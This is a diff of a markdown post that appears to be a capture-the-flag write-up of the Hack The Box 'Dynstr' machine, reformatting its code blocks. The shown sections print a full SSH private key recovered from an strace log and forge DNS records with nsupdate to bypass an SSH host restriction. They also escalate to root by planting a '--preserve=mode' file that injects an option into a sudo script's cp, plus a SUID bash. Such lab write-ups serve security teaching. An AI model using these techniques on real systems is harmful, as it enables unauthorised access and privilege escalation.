@@ -10,7 +10,7 @@ tags:
 date: 2021-10-16 16:00:00
 header:
   teaser: https://i.imgur.com/89b1SdH.png
-  og_image: *teaser
+  og_image: https://i.imgur.com/89b1SdH.png
 ---
 
 Hello guys!
@@ -216,130 +216,130 @@ Started enumeration using the obtained account `www-data`, default for apache, u
 
 - Users with console and their permissions:
 
-  ```plaintext
-  uid=0(root) gid=0(root) groups=0(root)
-  uid=1000(dyna) gid=1000(dyna) groups=1000(dyna),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
-  uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
-  ```
+```plaintext
+uid=0(root) gid=0(root) groups=0(root)
+uid=1000(dyna) gid=1000(dyna) groups=1000(dyna),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
+```
 
 - Ability to list files inside others home directories, where we can see some SSH Keys for `bindmgr` account
 
-  ```plaintext
-  ╔══════════╣ Files inside others home (limit 20)                                                                             /home/bindmgr/support-case-C62796521/strace-C62796521.txt
-  /home/bindmgr/support-case-C62796521/C62796521-debugging.script
-  /home/bindmgr/support-case-C62796521/C62796521-debugging.timing
-  /home/bindmgr/support-case-C62796521/command-output-C62796521.txt
-  /home/bindmgr/user.txt
-  /home/bindmgr/.ssh/known_hosts
-  /home/bindmgr/.ssh/id_rsa.pub
-  /home/bindmgr/.ssh/authorized_keys
-  /home/bindmgr/.ssh/id_rsa
-  /home/bindmgr/.bashrc
-  /home/bindmgr/.bash_logout
-  /home/bindmgr/.profile
-  /home/dyna/.bashrc
-  /home/dyna/.bash_logout
-  /home/dyna/.profile
-  /home/dyna/.sudo_as_admin_successful
-  ```
+```plaintext
+╔══════════╣ Files inside others home (limit 20)                                                                             /home/bindmgr/support-case-C62796521/strace-C62796521.txt
+/home/bindmgr/support-case-C62796521/C62796521-debugging.script
+/home/bindmgr/support-case-C62796521/C62796521-debugging.timing
+/home/bindmgr/support-case-C62796521/command-output-C62796521.txt
+/home/bindmgr/user.txt
+/home/bindmgr/.ssh/known_hosts
+/home/bindmgr/.ssh/id_rsa.pub
+/home/bindmgr/.ssh/authorized_keys
+/home/bindmgr/.ssh/id_rsa
+/home/bindmgr/.bashrc
+/home/bindmgr/.bash_logout
+/home/bindmgr/.profile
+/home/dyna/.bashrc
+/home/dyna/.bash_logout
+/home/dyna/.profile
+/home/dyna/.sudo_as_admin_successful
+```
 
   Checking the contents of `/home/bindmgr`, we can see the `user.txt` file but we have no read rights on it. In this user's profile, there's also a folder called `support-case-C62796521`, which contains some debugging/tracing output from some tasks executed in the server.
 
-  ```bash
-  www-data@dynstr:/var/www$ ls -la /home/bindmgr/
-  total 36
-  drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
-  drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
-  lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
-  -rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
-  -rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
-  drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
-  -rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
-  drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
-  drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
-  -r-------- 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
-  www-data@dynstr:/var/www$
-  ```
+```bash
+www-data@dynstr:/var/www$ ls -la /home/bindmgr/
+total 36
+drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
+drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
+lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
+-rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
+drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
+-rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
+drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
+drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
+-r-------- 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
+www-data@dynstr:/var/www$
+```
 
   After analyzing the files, noticed that in `strace-C62796521.txt` we have the private key in plain text, which was extracted and saved as an `id_rsa` file.
 
-  ```plaintext
-  [...]
-  15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
-  [...]
-  ```
+```plaintext
+[...]
+15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
+[...]
+```
 
-  When I tried to SSH to bindmgr account using this key, noticed that it failed. Checking the contents of `authorized_keys` file, verified that we have a `from` option defined, that will prevent us from accessing the account using that key if not registered as a `*.infra.dyna.htb` subdomain.
+When I tried to SSH to bindmgr account using this key, noticed that it failed. Checking the contents of `authorized_keys` file, verified that we have a `from` option defined, that will prevent us from accessing the account using that key if not registered as a `*.infra.dyna.htb` subdomain.
 
-  ```bash
-  www-data@dynstr:/tmp$ cat /home/bindmgr/.ssh/authorized_keys
-  from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
-  ```
+```bash
+www-data@dynstr:/tmp$ cat /home/bindmgr/.ssh/authorized_keys
+from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
+```
 
-  To achieve that, we would need to edit the hosts file, not possible with current credentials, but we could also leverage `nsupdate` to include our DNS entry into the `infra.dyna.htb` zone, where I've captured the command used in the API to be reused in our scenario:
+To achieve that, we would need to edit the hosts file, not possible with current credentials, but we could also leverage `nsupdate` to include our DNS entry into the `infra.dyna.htb` zone, where I've captured the command used in the API to be reused in our scenario:
 
-  ```php
-  // Update DNS entry
-  $cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
-  system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
-  ```
+```php
+// Update DNS entry
+$cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
+system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
+```
 
-  Based on that, crafted the following command line to add our IP as a known subdomain
+Based on that, crafted the following command line to add our IP as a known subdomain
 
-  ```bash
-  www-data@dynstr:/dev/shm$ cat nsupdate
-  server 127.0.0.1
-  zone dyna.htb
-  update delete attacker.infra.dyna.htb
-  update add attacker.infra.dyna.htb 30 IN A 10.10.10.10
-  send
-  www-data@dynstr:/dev/shm$ cat nsupdate | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key
-  update failed: REFUSED
-  ```
+```bash
+www-data@dynstr:/dev/shm$ cat nsupdate
+server 127.0.0.1
+zone dyna.htb
+update delete attacker.infra.dyna.htb
+update add attacker.infra.dyna.htb 30 IN A 10.10.10.10
+send
+www-data@dynstr:/dev/shm$ cat nsupdate | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key
+update failed: REFUSED
+```
 
-  After some research, found that this REFUSED error could be due to the key used and, checking the directory where the `ddns.key` was located, found 2 other files (as below), where the include using the file `infra.key` worked successfully **BUT** I still wasn't able to connect using SSH.
+After some research, found that this REFUSED error could be due to the key used and, checking the directory where the `ddns.key` was located, found 2 other files (as below), where the include using the file `infra.key` worked successfully **BUT** I still wasn't able to connect using SSH.
 
-  ```bash
-  www-data@dynstr:/dev/shm$ ls -la /etc/bind/*.key
-  -rw-r--r-- 1 root bind 100 Mar 15 20:44 /etc/bind/ddns.key
-  -rw-r--r-- 1 root bind 101 Mar 15 20:44 /etc/bind/infra.key
-  -rw-r----- 1 bind bind 100 Mar 15 20:14 /etc/bind/rndc.key
-  ```
+```bash
+www-data@dynstr:/dev/shm$ ls -la /etc/bind/*.key
+-rw-r--r-- 1 root bind 100 Mar 15 20:44 /etc/bind/ddns.key
+-rw-r--r-- 1 root bind 101 Mar 15 20:44 /etc/bind/infra.key
+-rw-r----- 1 bind bind 100 Mar 15 20:14 /etc/bind/rndc.key
+```
 
-  Doing some troubleshooting, noticed that I was able to solve the `attacker.infra.dyna.htb` but the reverse lookup of the IP address wasn't possible. To fix this, I have added another entry in the `nsupdate` command to also include a PTR record to the IP as below. A crucial point I also had to troubleshoot was that the A and PTR records **must be separated by a blank line**, otherwise the update would fail.
+Doing some troubleshooting, noticed that I was able to solve the `attacker.infra.dyna.htb` but the reverse lookup of the IP address wasn't possible. To fix this, I have added another entry in the `nsupdate` command to also include a PTR record to the IP as below. A crucial point I also had to troubleshoot was that the A and PTR records **must be separated by a blank line**, otherwise the update would fail.
 
-  ```bash
-  www-data@dynstr:/dev/shm$ cat nsupdate
-  server 127.0.0.1
-  update add attacker.infra.dyna.htb 30 A 10.10.10.10
-  send
-  
-  update add 121.14.10.10.in-addr.arpa 30 PTR attacker.infra.dyna.htb
-  send
-  www-data@dynstr:/dev/shm$ cat nsupdate | /usr/bin/nsupdate -t 1 -k /etc/bind/infra.key
-  www-data@dynstr:/dev/shm$
-  ```
+```bash
+www-data@dynstr:/dev/shm$ cat nsupdate
+server 127.0.0.1
+update add attacker.infra.dyna.htb 30 A 10.10.10.10
+send
 
-  After that adjustment, I was able to SSH as `bindmgr` and read the content of `user.txt` file
+update add 121.14.10.10.in-addr.arpa 30 PTR attacker.infra.dyna.htb
+send
+www-data@dynstr:/dev/shm$ cat nsupdate | /usr/bin/nsupdate -t 1 -k /etc/bind/infra.key
+www-data@dynstr:/dev/shm$
+```
 
-  ```bash
-  bindmgr@dynstr:~$ ls -la
-  total 36
-  drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
-  drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
-  lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
-  -rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
-  -rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
-  drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
-  -rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
-  drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
-  drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
-  -r-------- 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
-  bindmgr@dynstr:~$ cat use
-  cat: use: No such file or directory
-  bindmgr@dynstr:~$ cat user.txt
-  <redacted>
-  ```
+After that adjustment, I was able to SSH as `bindmgr` and read the content of `user.txt` file
+
+```bash
+bindmgr@dynstr:~$ ls -la
+total 36
+drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
+drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
+lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
+-rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
+drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
+-rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
+drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
+drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
+-r-------- 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
+bindmgr@dynstr:~$ cat use
+cat: use: No such file or directory
+bindmgr@dynstr:~$ cat user.txt
+<redacted>
+```
 
 ## Root flag
 
@@ -402,42 +402,42 @@ This was achieved by running the steps below:
 
 - Copied `/bin/bash` to a working temp directory and changed its permissions, setting its SUID bit and creating the `.version` file.
 
-  ```bash
-  bindmgr@dynstr:/tmp$ cd $(mktemp -d)
-  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ cp /bin/bash .
-  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ chmod u+s bash
-  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo 1 > .version
-  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ ls -la
-  total 1168
-  drwx------  2 bindmgr bindmgr    4096 Aug 16 19:22 .
-  drwxrwxrwt 13 root    root       4096 Aug 16 19:22 ..
-  -rwsr-xr-x  1 bindmgr bindmgr 1183448 Aug 16 19:22 bash
-  -rw-rw-r--  1 bindmgr bindmgr       2 Aug 16 19:22 .version
-  ```
+```bash
+bindmgr@dynstr:/tmp$ cd $(mktemp -d)
+bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ cp /bin/bash .
+bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ chmod u+s bash
+bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo 1 > .version
+bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ ls -la
+total 1168
+drwx------  2 bindmgr bindmgr    4096 Aug 16 19:22 .
+drwxrwxrwt 13 root    root       4096 Aug 16 19:22 ..
+-rwsr-xr-x  1 bindmgr bindmgr 1183448 Aug 16 19:22 bash
+-rw-rw-r--  1 bindmgr bindmgr       2 Aug 16 19:22 .version
+```
 
 - Created a file called `--preserve=mode`, so its name could be expanded as a parameter for `cp` during script execution, copying `bash` as root but keeping SUID set. We can confirm that as well using `echo`, also below
 
-  ```bash
-  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo "" > ./--preserve=mode
-  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo *
-  bash --preserve=mode
-  ```
+```bash
+bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo "" > ./--preserve=mode
+bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo *
+bash --preserve=mode
+```
 
 - Ran the script using `sudo`
 
-  ```bash
-  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ sudo /usr/local/bin/bindmgr.sh
-  sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
-  [+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.7i6oryDsae.
-  [+] Creating /etc/bind/named.conf.bindmgr file.
-  [+] Staging files to /etc/bind/named.bindmgr.
-  [+] Checking staged configuration.
-  [-] ERROR: The generated configuration is not valid. Please fix following errors:
-      /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
-      /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
-      /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
-      /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
-  ```
+```bash
+bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ sudo /usr/local/bin/bindmgr.sh
+sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.7i6oryDsae.
+[+] Creating /etc/bind/named.conf.bindmgr file.
+[+] Staging files to /etc/bind/named.bindmgr.
+[+] Checking staged configuration.
+[-] ERROR: The generated configuration is not valid. Please fix following errors:
+    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
+    /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
+    /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
+    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
+```
 
 - Executed the `bash` binary with `-p` parameter, as stated in [bash \| GTFOBins](https://gtfobins.github.io/gtfobins/bash/#suid), giving me an interactive shell as `root` and able to read contents of `/root/root.txt` file :smiley:
 
